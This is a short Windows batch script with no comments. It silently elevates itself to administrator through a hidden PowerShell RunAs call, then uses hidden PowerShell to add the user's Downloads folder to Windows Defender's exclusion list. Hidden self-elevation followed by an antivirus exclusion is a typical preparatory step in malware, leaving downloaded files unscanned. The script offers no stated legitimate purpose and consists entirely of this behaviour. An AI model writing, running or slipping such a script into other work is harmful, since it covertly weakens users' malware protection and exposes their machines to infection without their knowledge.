@echo off
fltmc >nul 2>&1
if errorlevel 1 (
    powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%ComSpec%' -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden"
    exit /b
)

powershell.exe -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath ($env:USERPROFILE + '\Downloads')"
exit